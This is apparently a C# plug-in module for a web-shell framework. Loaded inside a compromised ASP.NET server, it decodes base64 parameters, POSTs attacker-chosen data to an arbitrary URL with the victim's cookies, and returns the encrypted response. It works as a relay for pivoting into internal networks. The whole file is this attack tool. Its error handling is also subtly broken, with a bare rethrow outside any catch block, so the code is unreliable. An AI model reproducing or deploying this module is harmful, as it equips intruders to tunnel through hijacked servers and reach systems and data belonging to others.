using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Net;

public class payload
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private byte[] HttpPost(string szUrl, byte[] postBytes, string contentType, HttpResponse response, HttpRequest request)
    {
        HttpWebRequest webReq = (HttpWebRequest)WebRequest.Create(szUrl);
        webReq.Method = "POST";
        webReq.Timeout = 15000;
        webReq.ReadWriteTimeout = 15000;
        webReq.ContentType = contentType;
        webReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        webReq.AllowAutoRedirect = true;

        string cookieHeader = request.Headers["Cookie"];
        if (!string.IsNullOrEmpty(cookieHeader))
        {
            webReq.Headers["Cookie"] = cookieHeader;
        }

        if (postBytes != null && postBytes.Length > 0)
        {
            webReq.ContentLength = postBytes.Length;
            using (Stream reqStream = webReq.GetRequestStream())
            {
                reqStream.Write(postBytes, 0, postBytes.Length);
            }
        }

        try
        {
            using (HttpWebResponse webResp = (HttpWebResponse)webReq.GetResponse())
            {
                if (webResp.Headers["Set-Cookie"] != null)
                {
                    foreach (string cookieVal in webResp.Headers.GetValues("Set-Cookie"))
                    {
                        response.AddHeader("Set-Cookie", cookieVal);
                    }
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    using (Stream respStream = webResp.GetResponseStream())
                    {
                        respStream.CopyTo(ms);
                    }
                    return ms.ToArray();
                }
            }
        }
        catch
        {
            
        }

        using (WebException webEx = new WebException())
        {
            if (webEx.Response is HttpWebResponse errResp)
            {
                if (errResp.Headers["Set-Cookie"] != null)
                {
                    foreach (string cookieVal in errResp.Headers.GetValues("Set-Cookie"))
                    {
                        response.AddHeader("Set-Cookie", cookieVal);
                    }
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    using (Stream respStream = errResp.GetResponseStream())
                    {
                        respStream.CopyTo(ms);
                    }
                    return ms.ToArray();
                }
            }
            throw;
        }
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            string szUrl = fnB64Decode(dic["z0"]);
            byte[] decodedData = Convert.FromBase64String(dic["z1"]);
            bool bIsBinary = fnB64Decode(dic["z2"]).Equals("binary", StringComparison.OrdinalIgnoreCase);

            byte[] responseBytes;
            if (bIsBinary)
            {
                responseBytes = HttpPost(szUrl, decodedData, "application/octet-stream", response, request);
            }
            else
            {
                string szTextPayload = Encoding.UTF8.GetString(decodedData);
                byte[] postBytes = Encoding.UTF8.GetBytes(szTextPayload);
                responseBytes = HttpPost(szUrl, postBytes, "application/x-www-form-urlencoded", response, request);
            }

            byte[] finalOutputBytes;
            if (bIsBinary)
            {
                string base64Result = Convert.ToBase64String(responseBytes);
                finalOutputBytes = Encoding.UTF8.GetBytes(base64Result);
            }
            else
            {
                finalOutputBytes = responseBytes;
            }

            fnWriteOutput(driver, response, finalOutputBytes);
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}